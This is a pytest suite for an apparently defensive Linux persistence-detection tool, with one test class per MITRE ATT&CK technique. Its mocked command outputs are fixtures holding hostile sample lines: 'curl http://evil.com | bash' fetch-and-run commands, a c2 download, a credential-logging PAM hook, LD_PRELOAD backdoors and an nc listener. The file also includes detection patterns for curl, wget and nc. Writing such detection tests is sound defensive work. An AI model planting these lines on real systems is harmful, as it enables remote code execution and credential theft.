"""Tests for persistence modules."""

from __future__ import annotations

from unittest.mock import MagicMock

import pytest

from core.models import Severity, Status, Tactic, SessionType, Target
from core.session import CommandResult, Session


def make_session(responses: dict[str, CommandResult] | None = None) -> Session:
    """Create a mock session with configurable command responses."""
    target = Target(host="localhost", session_type=SessionType.LOCAL)
    session = Session(target)
    session._connected = True

    default = CommandResult(stdout="", stderr="", return_code=1)
    resp = responses or {}

    def mock_execute(command: str, timeout: int = 60, sudo: bool = False) -> CommandResult:
        for pattern, result in resp.items():
            if pattern in command:
                return result
        return default

    session.execute = MagicMock(side_effect=mock_execute)
    return session


# ---------------------------------------------------------------------------
# 1. T1543 — Systemd Service Persistence
# ---------------------------------------------------------------------------
class TestSystemdServicePersistenceCheck:
    def test_module_attributes(self):
        from modules.persistence.T1543_systemd_service import SystemdServicePersistenceCheck
        m = SystemdServicePersistenceCheck()
        assert m.TECHNIQUE_ID == "T1543"
        assert m.TACTIC == Tactic.PERSISTENCE
        assert m.SAFE_MODE is True

    def test_check_finds_vulnerabilities(self):
        from modules.persistence.T1543_systemd_service import SystemdServicePersistenceCheck
        session = make_session({
            "find /etc/systemd/system /usr/lib/systemd/system /usr/local/lib/systemd/system":
                CommandResult("/etc/systemd/system/backdoor.service", "", 0),
            "grep -rls 'ExecStart'":
                CommandResult("/etc/systemd/system/backdoor.service", "", 0),
            "grep -rh 'ExecStart=.*/":
                CommandResult("ExecStart=/tmp/evil.sh", "", 0),
            "grep -rlZ 'Type=oneshot'":
                CommandResult("/etc/systemd/system/oneshot.service", "", 0),
            "for svc in $(systemctl list-unit-files":
                CommandResult("UNPACKAGED: evil.service", "", 0),
            "-perm -o+w":
                CommandResult("/etc/systemd/system/writable.service", "", 0),
            "ls -la /etc/systemd/system-generators/":
                CommandResult("total 4\n-rwxr-xr-x 1 root root 1234 evil-gen", "", 0),
            "for f in /etc/systemd/system-generators":
                CommandResult("UNPACKAGED: /etc/systemd/system-generators/evil-gen", "", 0),
        })
        m = SystemdServicePersistenceCheck()
        result = m.check(session)
        assert result.status == Status.VULNERABLE
        assert result.finding_count >= 3


# ---------------------------------------------------------------------------
# 2. T1546 — Event Triggered Execution
# ---------------------------------------------------------------------------
class TestEventTriggeredCheck:
    def test_module_attributes(self):
        from modules.persistence.T1546_event_triggered import EventTriggeredCheck
        m = EventTriggeredCheck()
        assert m.TECHNIQUE_ID == "T1546"
        assert m.TACTIC == Tactic.PERSISTENCE
        assert m.SAFE_MODE is True

    def test_check_finds_vulnerabilities(self):
        from modules.persistence.T1546_event_triggered import EventTriggeredCheck
        session = make_session({
            "grep -rn -E 'curl |wget ":
                CommandResult("/etc/profile.d/evil.sh:1:curl http://evil.com | bash", "", 0),
            "for home in /root /home/*":
                CommandResult("/home/user/.bashrc:5:wget http://c2.evil.com/shell", "", 0),
            "find /etc/profile.d/":
                CommandResult("/etc/profile.d/evil.sh", "", 0),
            "grep -rn 'trap '":
                CommandResult("/etc/profile.d/trap.sh:1:trap '/tmp/persist.sh' EXIT", "", 0),
            "rpm -qa --scripts":
                CommandResult("postinstall scriptlet:\ncurl http://evil.com/install.sh | bash", "", 0),
            "rpm -qa --qf":
                CommandResult("evil-pkg-1.0-1 (none)", "", 0),
            "grep -rn 'RUN+='":
                CommandResult("/etc/udev/rules.d/99-backdoor.rules:1:RUN+=/tmp/evil.sh", "", 0),
            "find /etc/udev/rules.d/ -type f \\(":
                CommandResult("/etc/udev/rules.d/99-backdoor.rules", "", 0),
            "find /etc/udev/rules.d/ -type f -mtime":
                CommandResult("/etc/udev/rules.d/99-backdoor.rules", "", 0),
            "grep -rn 'PYTHONSTARTUP'":
                CommandResult("/etc/profile.d/python.sh:1:export PYTHONSTARTUP=/tmp/evil.py", "", 0),
            "find /usr/lib/python":
                CommandResult("/usr/lib/python3.9/site-packages/sitecustomize.py", "", 0),
            "cat '/usr/lib/python3.9/site-packages/sitecustomize.py'":
                CommandResult("import os\nos.system('curl http://evil.com')", "", 0),
            "grep -nE 'curl":
                CommandResult("1:import os", "", 0),
        })
        m = EventTriggeredCheck()
        result = m.check(session)
        assert result.status == Status.VULNERABLE
        assert result.finding_count >= 4


# ---------------------------------------------------------------------------
# 3. T1098 — Account Manipulation
# ---------------------------------------------------------------------------
class TestAccountManipulationCheck:
    def test_module_attributes(self):
        from modules.persistence.T1098_account_manipulation import AccountManipulationCheck
        m = AccountManipulationCheck()
        assert m.TECHNIQUE_ID == "T1098"
        assert m.TACTIC == Tactic.PERSISTENCE
        assert m.SAFE_MODE is True

    def test_check_finds_vulnerabilities(self):
        from modules.persistence.T1098_account_manipulation import AccountManipulationCheck
        session = make_session({
            "find /root /home -name 'authorized_keys'":
                CommandResult("/root/.ssh/authorized_keys", "", 0),
            "stat -c '%a %U:%G'":
                CommandResult("777 root:root", "", 0),
            "grep -c '^[^#]'":
                CommandResult("10", "", 0),
            "grep -c '^from='":
                CommandResult("0", "", 0),
            "awk '{print NR, $1, $NF}'":
                CommandResult("1 ssh-rsa user@host\n2 ssh-rsa other@host", "", 0),
            "find / -name 'authorized_keys' -not -path":
                CommandResult("/var/spool/.ssh/authorized_keys", "", 0),
            "grep -i 'AuthorizedKeysFile'":
                CommandResult("AuthorizedKeysFile /var/spool/.ssh/authorized_keys", "", 0),
            "getent group":
                CommandResult("wheel:x:10:admin,hacker", "", 0),
            "awk -F: '$4 == 0 && $1 != \"root\"'":
                CommandResult("backdoor:x:1001:0::/home/backdoor:/bin/bash", "", 0),
            "find /etc/group -mtime -7":
                CommandResult("/etc/group\nRECENTLY_MODIFIED", "", 0),
        })
        m = AccountManipulationCheck()
        result = m.check(session)
        assert result.status == Status.VULNERABLE
        assert result.finding_count >= 3


# ---------------------------------------------------------------------------
# 4. T1136 — Create Account
# ---------------------------------------------------------------------------
class TestCreateAccountCheck:
    def test_module_attributes(self):
        from modules.persistence.T1136_create_account import CreateAccountCheck
        m = CreateAccountCheck()
        assert m.TECHNIQUE_ID == "T1136"
        assert m.TACTIC == Tactic.PERSISTENCE
        assert m.SAFE_MODE is True

    def test_check_finds_vulnerabilities(self):
        from modules.persistence.T1136_create_account import CreateAccountCheck
        session = make_session({
            "awk -F: '$3 == 0 && $1 != \"root\" {print $0}'":
                CommandResult("backdoor:x:0:0::/root:/bin/bash", "", 0),
            "awk -F: '$3 >= 1000 && $3 < 65534 {print $1, $3, $7}'":
                CommandResult("user1 1000 /bin/bash\nuser2 1001 /bin/bash", "", 0),
            "chage -l":
                CommandResult("Last password change : Mar 15, 2026", "", 0),
            "awk -F: '$2 == \"\" || $2 == \"!\"":
                CommandResult("testuser", "", 0),
            "cat /etc/passwd":
                CommandResult("testuser:x:1002:1002::/home/testuser:/bin/bash", "", 0),
            "awk -F: '$3 < 1000 && $3 != 0 && $7 !=":
                CommandResult("games 12 /bin/sh", "", 0),
            "systemctl is-active sssd":
                CommandResult("inactive", "", 3),
            "systemctl is-active winbind":
                CommandResult("inactive", "", 3),
            "cat /etc/default/useradd":
                CommandResult("SHELL=/bin/bash\nINACTIVE=-1", "", 0),
            "grep -E '^(PASS_MAX_DAYS":
                CommandResult("PASS_MAX_DAYS 99999\nPASS_MIN_DAYS 0\nPASS_MIN_LEN 5\nPASS_WARN_AGE 3", "", 0),
        })
        m = CreateAccountCheck()
        result = m.check(session)
        assert result.status == Status.VULNERABLE
        assert result.finding_count >= 3


# ---------------------------------------------------------------------------
# 5. T1574 — Hijack Execution Flow
# ---------------------------------------------------------------------------
class TestHijackExecutionCheck:
    def test_module_attributes(self):
        from modules.persistence.T1574_hijack_execution import HijackExecutionCheck
        m = HijackExecutionCheck()
        assert m.TECHNIQUE_ID == "T1574"
        assert m.TACTIC == Tactic.PERSISTENCE
        assert m.SAFE_MODE is True

    def test_check_finds_vulnerabilities(self):
        from modules.persistence.T1574_hijack_execution import HijackExecutionCheck
        session = make_session({
            "cat /etc/ld.so.preload":
                CommandResult("/tmp/evil.so", "", 0),
            "grep -rn 'LD_PRELOAD'":
                CommandResult("/etc/profile.d/evil.sh:1:export LD_PRELOAD=/tmp/evil.so", "", 0),
            "find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -perm -4000":
                CommandResult("RPATH /tmp/lib\n  -> /usr/bin/suidapp", "", 0),
            "cat /etc/ld.so.conf.d/":
                CommandResult("/opt/shady/lib", "", 0),
            "ldconfig -p":
                CommandResult("WRITABLE: /tmp/lib", "", 0),
            "echo $PATH | tr ':' '\\n' | while read d":
                CommandResult("WRITABLE: /tmp/bin", "", 0),
            "echo $PATH | tr ':' '\\n' | grep -nE":
                CommandResult("1:.", "", 0),
            "sudo -n grep":
                CommandResult("", "", 1),
            "grep -E '^(export )?PATH='":
                CommandResult("/etc/profile.d/path.sh:PATH=.:/usr/bin", "", 0),
            "grep -rn 'Environment.*PATH'":
                CommandResult("/etc/systemd/system/bad.service:Environment=PATH=/tmp:/usr/bin", "", 0),
            "grep -rn 'PATH=' /etc/profile.d/":
                CommandResult("", "", 1),
        })
        m = HijackExecutionCheck()
        result = m.check(session)
        assert result.status == Status.VULNERABLE
        assert result.finding_count >= 3


# ---------------------------------------------------------------------------
# 6. T1556 — Modify Authentication Process
# ---------------------------------------------------------------------------
class TestModifyAuthCheck:
    def test_module_attributes(self):
        from modules.persistence.T1556_modify_auth import ModifyAuthCheck
        m = ModifyAuthCheck()
        assert m.TECHNIQUE_ID == "T1556"
        assert m.TACTIC == Tactic.PERSISTENCE
        assert m.SAFE_MODE is True

    def test_check_finds_vulnerabilities(self):
        from modules.persistence.T1556_modify_auth import ModifyAuthCheck
        session = make_session({
            "grep -rh 'auth\\|session":
                CommandResult("UNPACKAGED: pam_evil", "", 0),
            "grep -rn 'pam_exec.so'":
                CommandResult("/etc/pam.d/sshd:auth required pam_exec.so /tmp/log_creds.sh", "", 0),
            "grep -rn 'pam_permit.so'":
                CommandResult("/etc/pam.d/system-auth:auth sufficient pam_permit.so", "", 0),
            "rpm -Vf /usr/lib64/security/pam_unix.so":
                CommandResult("..5....T. /usr/lib64/security/pam_unix.so", "", 0),
            "find /etc/pam.d/ -type f \\(":
                CommandResult("/etc/pam.d/evil-pam", "", 0),
            "grep -rl 'pam_google_authenticator":
                CommandResult("", "", 1),
            "find /home /root -name '.google_authenticator'":
                CommandResult("", "", 1),
            "rpm -V pam":
                CommandResult("..5....T. /etc/security/access.conf", "", 0),
            "grep -rn 'pam_succeed_if'":
                CommandResult("/etc/pam.d/su:auth sufficient pam_succeed_if.so user = hacker", "", 0),
        })
        m = ModifyAuthCheck()
        result = m.check(session)
        assert result.status == Status.VULNERABLE
        assert result.finding_count >= 4


# ---------------------------------------------------------------------------
# 7. T1554 — Compromise Host Software Binary
# ---------------------------------------------------------------------------
class TestCompromiseBinaryCheck:
    def test_module_attributes(self):
        from modules.persistence.T1554_compromise_binary import CompromiseBinaryCheck
        m = CompromiseBinaryCheck()
        assert m.TECHNIQUE_ID == "T1554"
        assert m.TACTIC == Tactic.PERSISTENCE
        assert m.SAFE_MODE is True

    def test_check_finds_vulnerabilities(self):
        from modules.persistence.T1554_compromise_binary import CompromiseBinaryCheck
        session = make_session({
            "rpm -Va":
                CommandResult("..5....T. /usr/bin/ssh\n..5....T. /usr/sbin/sshd", "", 0),
            "for bin in /usr/bin/ssh":
                CommandResult("..5....T. /usr/bin/ssh\n  -> /usr/bin/ssh", "", 0),
            "for bin in /usr/bin/ssh /usr/sbin/sshd /usr/bin/sudo":
                CommandResult("NEWER: /usr/bin/ssh (file: 2026-03-20, pkg: 2026-01-01)", "", 0),
            "cat /etc/environment":
                CommandResult("LD_PRELOAD=/tmp/evil.so", "", 0),
            "test -f /etc/ld.so.preload":
                CommandResult("/tmp/evil.so", "", 0),
            "find /usr/bin /usr/sbin -type f -executable":
                CommandResult("UNPACKAGED: /usr/bin/evil-bin", "", 0),
            "rpm -q prelink":
                CommandResult("prelink-0.5.0-1.el8.x86_64", "", 0),
            "prelink --verify":
                CommandResult("/usr/bin/something: changed", "", 0),
        })
        m = CompromiseBinaryCheck()
        result = m.check(session)
        assert result.status == Status.VULNERABLE
        assert result.finding_count >= 3


# ---------------------------------------------------------------------------
# 8. T1547 — Boot or Logon Autostart Execution
# ---------------------------------------------------------------------------
class TestBootAutostartCheck:
    def test_module_attributes(self):
        from modules.persistence.T1547_boot_autostart import BootAutostartCheck
        m = BootAutostartCheck()
        assert m.TECHNIQUE_ID == "T1547"
        assert m.TACTIC == Tactic.PERSISTENCE
        assert m.SAFE_MODE is True

    def test_check_finds_vulnerabilities(self):
        from modules.persistence.T1547_boot_autostart import BootAutostartCheck
        session = make_session({
            "cat /etc/modules-load.d/":
                CommandResult("evil_module", "", 0),
            "for f in /etc/modules-load.d/":
                CommandResult("UNPACKAGED: /etc/modules-load.d/evil.conf", "", 0),
            "lsmod":
                CommandResult("Module Size Used\nevil_mod 12345 0", "", 0),
            "modinfo":
                CommandResult("", "", 1),
            "grep -rn 'install\\|softdep' /etc/modprobe.d/":
                CommandResult("/etc/modprobe.d/evil.conf:install evil_mod /tmp/evil.sh", "", 0),
            "cat /proc/sys/kernel/modules_disabled":
                CommandResult("0\nN", "", 0),
            "find /etc/xdg/autostart/ -name '*.desktop'":
                CommandResult("/etc/xdg/autostart/evil.desktop", "", 0),
            "grep -h 'Exec=' /etc/xdg/autostart/":
                CommandResult("Exec=/tmp/evil.sh", "", 0),
            "for f in /etc/xdg/autostart/":
                CommandResult("UNPACKAGED: /etc/xdg/autostart/evil.desktop", "", 0),
            "find /home/*/.config/autostart/":
                CommandResult("/home/user/.config/autostart/evil.desktop", "", 0),
            "grep -h 'Exec=' /home/":
                CommandResult("Exec=/tmp/persist.sh", "", 0),
            "for f in /etc/rc.local":
                CommandResult("EXECUTABLE: /etc/rc.d/rc.local\n/tmp/evil.sh", "", 0),
            "systemctl is-enabled rc-local":
                CommandResult("enabled", "", 0),
            "grep -i 'init=' /boot/grub2/grub.cfg":
                CommandResult("init=/bin/bash", "", 0),
        })
        m = BootAutostartCheck()
        result = m.check(session)
        assert result.status == Status.VULNERABLE
        assert result.finding_count >= 4


# ---------------------------------------------------------------------------
# 9. T1037 — Boot or Logon Initialization Scripts
# ---------------------------------------------------------------------------
class TestBootInitScriptsCheck:
    def test_module_attributes(self):
        from modules.persistence.T1037_boot_init_scripts import BootInitScriptsCheck
        m = BootInitScriptsCheck()
        assert m.TECHNIQUE_ID == "T1037"
        assert m.TACTIC == Tactic.PERSISTENCE
        assert m.SAFE_MODE is True

    def test_check_finds_vulnerabilities(self):
        from modules.persistence.T1037_boot_init_scripts import BootInitScriptsCheck
        session = make_session({
            "for f in /etc/rc.local /etc/rc.d/rc.local":
                CommandResult("=== /etc/rc.d/rc.local (perms: 755) ===\n/tmp/evil.sh", "", 0),
            "systemctl is-enabled rc-local":
                CommandResult("enabled", "", 0),
            "for f in /etc/init.d/":
                CommandResult("UNPACKAGED: /etc/init.d/evil-script", "", 0),
            "for f in /etc/profile.d/":
                CommandResult("UNPACKAGED: /etc/profile.d/evil.sh", "", 0),
            "head -5":
                CommandResult("#!/bin/bash\ncurl http://evil.com | bash", "", 0),
            "cat /etc/environment":
                CommandResult("LD_PRELOAD=/tmp/evil.so", "", 0),
            "grep -i 'LD_PRELOAD":
                CommandResult("LD_PRELOAD=/tmp/evil.so", "", 0),
            "rpm -Vf /etc/bashrc":
                CommandResult("..5....T. /etc/bashrc", "", 0),
            "grep -n 'curl":
                CommandResult("/etc/bashrc:5:curl http://evil.com | bash", "", 0),
            "find /etc/systemd/user-environment-generators":
                CommandResult("/etc/systemd/user-environment-generators/evil-gen", "", 0),
            "for f in $(find /etc/systemd/user-environment-generators":
                CommandResult("UNPACKAGED: /etc/systemd/user-environment-generators/evil-gen", "", 0),
        })
        m = BootInitScriptsCheck()
        result = m.check(session)
        assert result.status == Status.VULNERABLE
        assert result.finding_count >= 4


# ---------------------------------------------------------------------------
# 10. T1668 — Exclusive Control
# ---------------------------------------------------------------------------
class TestExclusiveControlCheck:
    def test_module_attributes(self):
        from modules.persistence.T1668_exclusive_control import ExclusiveControlCheck
        m = ExclusiveControlCheck()
        assert m.TECHNIQUE_ID == "T1668"
        assert m.TACTIC == Tactic.PERSISTENCE
        assert m.SAFE_MODE is True

    def test_check_finds_vulnerabilities(self):
        from modules.persistence.T1668_exclusive_control import ExclusiveControlCheck
        session = make_session({
            "find /proc/*/fd -type l":
                CommandResult("PID=1234 CMD=evil FILE=/var/lock/db LOCK=lock: FLOCK WRITE", "", 0),
            "cat /proc/locks":
                CommandResult("1: FLOCK ADVISORY WRITE 1234 00:1e:12345 0 EOF", "", 0),
            "cat /proc/locks 2>/dev/null | grep 'FLOCK.*WRITE'":
                CommandResult("1: FLOCK ADVISORY WRITE 1234 00:1e:12345 0 EOF", "", 0),
            "find /run /var/run -name '*.pid' -type f":
                CommandResult("STALE: /run/evil.pid (PID=9999 -- process not running)", "", 0),
            "findmnt -n -l -t none":
                CommandResult("", "", 1),
            "mount 2>/dev/null | grep 'bind'":
                CommandResult("/dev/sda1 on /etc type ext4 (bind)", "", 0),
            "mount 2>/dev/null | grep 'bind' | grep -E":
                CommandResult("/dev/sda1 on /etc/shadow type ext4 (bind)", "", 0),
            "ls -la /proc/*/ns/mnt":
                CommandResult("3", "", 0),
            "ps aux":
                CommandResult("root 5678 unshare --mount /bin/evil", "", 0),
        })
        m = ExclusiveControlCheck()
        result = m.check(session)
        assert result.status == Status.VULNERABLE
        assert result.finding_count >= 2


# ---------------------------------------------------------------------------
# 11. T1653 — Power Settings
# ---------------------------------------------------------------------------
class TestPowerSettingsCheck:
    def test_module_attributes(self):
        from modules.persistence.T1653_power_settings import PowerSettingsCheck
        m = PowerSettingsCheck()
        assert m.TECHNIQUE_ID == "T1653"
        assert m.TACTIC == Tactic.PERSISTENCE
        assert m.SAFE_MODE is True

    def test_check_finds_vulnerabilities(self):
        from modules.persistence.T1653_power_settings import PowerSettingsCheck
        session = make_session({
            "systemctl is-enabled sleep.target":
                CommandResult("masked", "", 0),
            "systemctl is-enabled suspend.target":
                CommandResult("masked", "", 0),
            "systemctl is-enabled hibernate.target":
                CommandResult("masked", "", 0),
            "systemctl is-enabled hybrid-sleep.target":
                CommandResult("masked", "", 0),
            "grep -vE '^#|^$' /etc/systemd/logind.conf":
                CommandResult("[Login]\nHandleLidSwitch=ignore\nIdleAction=ignore", "", 0),
            "find /etc/systemd/logind.conf.d/":
                CommandResult("/etc/systemd/logind.conf.d/99-persist.conf", "", 0),
            "grep -hE '(HandleLidSwitch|HandlePowerKey|IdleAction":
                CommandResult("HandlePowerKey=ignore", "", 0),
            "rpm -q gnome-shell":
                CommandResult("gnome-shell-40.0-1.el9.x86_64", "", 0),
            "dconf read":
                CommandResult("false", "", 0),
            "gsettings get org.gnome.desktop.session idle-delay":
                CommandResult("uint32 0", "", 0),
            "ls /sys/class/net/":
                CommandResult("eth0\nlo", "", 0),
            "ethtool eth0":
                CommandResult("Wake-on: g", "", 0),
            "find /etc/acpi/ -type f -name '*.sh'":
                CommandResult("/etc/acpi/power.sh", "", 0),
            "grep -rlE '(curl|wget|nc":
                CommandResult("/etc/acpi/power.sh", "", 0),
            "find /etc/apcupsd/":
                CommandResult("/etc/apcupsd/apccontrol.sh", "", 0),
        })
        m = PowerSettingsCheck()
        result = m.check(session)
        assert result.status == Status.VULNERABLE
        assert result.finding_count >= 4


# ---------------------------------------------------------------------------
# 12. T1542 — Pre-OS Boot
# ---------------------------------------------------------------------------
class TestPreOSBootCheck:
    def test_module_attributes(self):
        from modules.persistence.T1542_pre_os_boot import PreOSBootCheck
        m = PreOSBootCheck()
        assert m.TECHNIQUE_ID == "T1542"
        assert m.TACTIC == Tactic.PERSISTENCE
        assert m.SAFE_MODE is True

    def test_check_finds_vulnerabilities(self):
        from modules.persistence.T1542_pre_os_boot import PreOSBootCheck
        session = make_session({
            "rpm -q fwupd":
                CommandResult("package fwupd is not installed", "", 1),
            "mokutil --sb-state":
                CommandResult("SecureBoot disabled", "", 0),
            "stat -c '%a %U %G' /boot/grub2/grub.cfg":
                CommandResult("644 root root", "", 0),
            "stat -c '%a %U %G' /boot/efi/EFI/redhat/grub.cfg":
                CommandResult("", "", 1),
            "stat -c '%a %U %G' /etc/default/grub":
                CommandResult("644 root root", "", 0),
            "grep -E '^(set superusers|password_pbkdf2":
                CommandResult("", "", 1),
            "stat -c '%a %U %G' /boot":
                CommandResult("755 root root", "", 0),
            "find /boot -not -user root -type f":
                CommandResult("/boot/evil_kernel", "", 0),
            "find /boot/efi/ -iname":
                CommandResult("/boot/efi/EFI/evil_shell.efi", "", 0),
            "cat /proc/cmdline":
                CommandResult("root=/dev/sda1 ro selinux=0 audit=0", "", 0),
            "rpm -V grub2-common grub2-tools":
                CommandResult("..5....T. /etc/grub.d/40_custom", "", 0),
        })
        m = PreOSBootCheck()
        result = m.check(session)
        assert result.status == Status.VULNERABLE
        assert result.finding_count >= 4


# ---------------------------------------------------------------------------
# 13. T1505 — Server Software Component
# ---------------------------------------------------------------------------
class TestServerComponentCheck:
    def test_module_attributes(self):
        from modules.persistence.T1505_server_component import ServerComponentCheck
        m = ServerComponentCheck()
        assert m.TECHNIQUE_ID == "T1505"
        assert m.TACTIC == Tactic.PERSISTENCE
        assert m.SAFE_MODE is True

    def test_check_finds_vulnerabilities(self):
        from modules.persistence.T1505_server_component import ServerComponentCheck
        session = make_session({
            "systemctl is-active postgresql":
                CommandResult("inactive", "", 3),
            "systemctl is-active mysqld":
                CommandResult("inactive", "", 3),
            "systemctl is-active mariadb":
                CommandResult("inactive", "", 3),
            "test -d /var/www/":
                CommandResult("exists", "", 0),
            "test -d /usr/share/nginx/":
                CommandResult("", "", 1),
            "test -d /opt/":
                CommandResult("exists", "", 0),
            "test -d /srv/www/":
                CommandResult("", "", 1),
            "grep -rlE '(eval\\(\\$_(GET|POST|REQUEST)":
                CommandResult("/var/www/html/shell.php", "", 0),
            "find /var/www/ \\( -name '*.php'":
                CommandResult("/var/www/html/shell.php", "", 0),
            "find /opt/ \\( -name '*.php'":
                CommandResult("", "", 1),
            "find /etc/httpd/modules/":
                CommandResult("UNPACKAGED: /usr/lib64/httpd/modules/mod_evil.so", "", 0),
            "nginx -V":
                CommandResult("UNPACKAGED: /usr/lib64/nginx/modules/ngx_evil.so", "", 0),
            "grep -rE '(Include|include).*(/tmp/":
                CommandResult("/etc/httpd/conf.d/evil.conf:Include /tmp/evil.conf", "", 0),
            "grep -E '^Plugin' /etc/sudo.conf":
                CommandResult("Plugin evil_plugin evil.so", "", 0),
            "find /usr/libexec/sudo/":
                CommandResult("", "", 1),
        })
        m = ServerComponentCheck()
        result = m.check(session)
        assert result.status == Status.VULNERABLE
        assert result.finding_count >= 2


# ---------------------------------------------------------------------------
# 14. T1176 — Software Extensions
# ---------------------------------------------------------------------------
class TestSoftwareExtensionsCheck:
    def test_module_attributes(self):
        from modules.persistence.T1176_software_extensions import SoftwareExtensionsCheck
        m = SoftwareExtensionsCheck()
        assert m.TECHNIQUE_ID == "T1176"
        assert m.TACTIC == Tactic.PERSISTENCE
        assert m.SAFE_MODE is True

    def test_check_finds_vulnerabilities(self):
        from modules.persistence.T1176_software_extensions import SoftwareExtensionsCheck
        session = make_session({
            "find /home/*/.config/google-chrome":
                CommandResult("/home/user/.config/google-chrome/Default/Extensions/abcdef", "", 0),
            "find /home/*/.config/google-chrome/*/Extensions":
                CommandResult("3\n5", "", 0),
            "find /etc/opt/chrome/policies/":
                CommandResult("/etc/opt/chrome/policies/managed/policy.json", "", 0),
            "grep -rl 'ExtensionInstallForcelist'":
                CommandResult("/etc/opt/chrome/policies/managed/policy.json", "", 0),
            "grep -A5 'ExtensionInstallForcelist'":
                CommandResult("ExtensionInstallForcelist: [evil_ext_id]", "", 0),
            "find /home/*/.mozilla/firefox":
                CommandResult("/home/user/.mozilla/firefox/default/extensions/evil.xpi", "", 0),
            "cat /usr/lib64/firefox/distribution/policies.json":
                CommandResult('{"policies":{"ExtensionSettings":{}}}', "", 0),
            "find /home/*/.vscode/extensions":
                CommandResult("/home/user/.vscode/extensions/evil-publisher.evil-ext-1.0.0", "", 0),
            "find /home/*/.local/share/JetBrains":
                CommandResult("/home/user/.local/share/JetBrains/IntelliJ/plugins/evil-plugin", "", 0),
            "find /home/*/.local/share/gnome-shell/extensions":
                CommandResult("/home/user/.local/share/gnome-shell/extensions/evil@ext", "", 0),
            "cat /home/user/.local/share/gnome-shell/extensions/evil@ext/metadata.json":
                CommandResult('{"name": "evil ext"}', "", 0),
            "find /usr/libexec/sudo/":
                CommandResult("/usr/libexec/sudo/evil_plugin.so", "", 0),
            "rpm -qf /usr/libexec/sudo/evil_plugin.so":
                CommandResult("file /usr/libexec/sudo/evil_plugin.so is not owned by any package", "", 1),
            "grep -E '^Plugin' /etc/sudo.conf":
                CommandResult("Plugin evil_audit evil_audit.so", "", 0),
        })
        m = SoftwareExtensionsCheck()
        result = m.check(session)
        assert result.status == Status.VULNERABLE
        assert result.finding_count >= 3


# ---------------------------------------------------------------------------
# 15. T1205 — Traffic Signaling
# ---------------------------------------------------------------------------
class TestTrafficSignalingCheck:
    def test_module_attributes(self):
        from modules.persistence.T1205_traffic_signaling import TrafficSignalingCheck
        m = TrafficSignalingCheck()
        assert m.TECHNIQUE_ID == "T1205"
        assert m.TACTIC == Tactic.PERSISTENCE
        assert m.SAFE_MODE is True

    def test_check_finds_vulnerabilities(self):
        from modules.persistence.T1205_traffic_signaling import TrafficSignalingCheck
        session = make_session({
            "rpm -q knock-server knock":
                CommandResult("knock-server-0.8-1.el8.x86_64", "", 0),
            "cat /etc/knockd.conf":
                CommandResult("[openSSH]\nsequence = 7000,8000,9000\ncommand = /sbin/iptables -A INPUT -p tcp --dport 22 -j ACCEPT", "", 0),
            "systemctl is-active knockd":
                CommandResult("active", "", 0),
            "rpm -q fwknop fwknop-server":
                CommandResult("fwknop-server-2.6.10-1.el8.x86_64", "", 0),
            "bpftool prog list":
                CommandResult("1: socket_filter name evil_filter", "", 0),
            "ss -nlpw":
                CommandResult("raw UNCONN 0 0 0.0.0.0:255 users:((\"evil\",pid=1234,fd=3))", "", 0),
            "iptables -S":
                CommandResult("-A INPUT -m recent --rcheck --seconds 30 --name knockstage1 -j ACCEPT", "", 0),
            "nft list ruleset":
                CommandResult("meter flood { type ipv4_addr . tcp dport; timeout 10s; }", "", 0),
            "ss -tlnp":
                CommandResult("LISTEN 0 128 0.0.0.0:4444 users:((\"nc\",pid=5678,fd=3))", "", 0),
            "getcap -r /":
                CommandResult("/usr/bin/evil_sniffer cap_net_raw=ep", "", 0),
            "sysctl kernel.unprivileged_bpf_disabled":
                CommandResult("kernel.unprivileged_bpf_disabled = 0", "", 0),
        })
        m = TrafficSignalingCheck()
        result = m.check(session)
        assert result.status == Status.VULNERABLE
        assert result.finding_count >= 4


# ---------------------------------------------------------------------------
# T1547.013 — XDG Autostart Entries
# ---------------------------------------------------------------------------


class TestXdgAutostartCheck:
    def test_attributes(self):
        from modules.persistence.T1547_013_xdg_autostart import XdgAutostartCheck
        m = XdgAutostartCheck()
        assert m.TECHNIQUE_ID == "T1547.013"
        assert m.TACTIC == Tactic.PERSISTENCE

    def test_writable_system_autostart(self):
        from modules.persistence.T1547_013_xdg_autostart import XdgAutostartCheck
        session = make_session({
            "find /home -path '*/.config/autostart": CommandResult("", "", 1),
            "find /etc/xdg/autostart": CommandResult("/etc/xdg/autostart/malware.desktop\n", "", 0),
            "test -w /etc/xdg/autostart/malware.desktop": CommandResult("writable\n", "", 0),
            "test -d /etc/xdg/autostart": CommandResult("", "", 0),
            "test -w /etc/xdg/autostart": CommandResult("writable\n", "", 0),
        })
        m = XdgAutostartCheck()
        result = m.check(session)
        assert result.status == Status.VULNERABLE

    def test_clean(self):
        from modules.persistence.T1547_013_xdg_autostart import XdgAutostartCheck
        m = XdgAutostartCheck()
        result = m.check(make_session({}))
        assert result.status == Status.NOT_VULNERABLE


# ---------------------------------------------------------------------------
# T1546.017 — Udev Rules
# ---------------------------------------------------------------------------


class TestUdevRulesCheck:
    def test_attributes(self):
        from modules.persistence.T1546_017_udev_rules import UdevRulesCheck
        m = UdevRulesCheck()
        assert m.TECHNIQUE_ID == "T1546.017"
        assert m.TACTIC == Tactic.PERSISTENCE

    def test_writable_rules_dir(self):
        from modules.persistence.T1546_017_udev_rules import UdevRulesCheck
        session = make_session({
            "test -d /etc/udev/rules.d": CommandResult("", "", 0),
            "/etc/udev/rules.d": CommandResult("writable\n", "", 0),
            "test -d /usr/lib/udev/rules.d": CommandResult("", "", 1),
            "test -d /run/udev/rules.d": CommandResult("", "", 1),
            "grep -rn 'RUN+='": CommandResult("", "", 1),
            "find /etc/udev/rules.d/ -name '*.rules'": CommandResult("", "", 1),
        })
        m = UdevRulesCheck()
        result = m.check(session)
        assert result.status == Status.VULNERABLE
        assert any("udev" in f.title.lower() or "Writable" in f.title for f in result.findings)

    def test_mitigations(self):
        from modules.persistence.T1546_017_udev_rules import UdevRulesCheck
        m = UdevRulesCheck()
        assert len(m.get_mitigations()) > 0
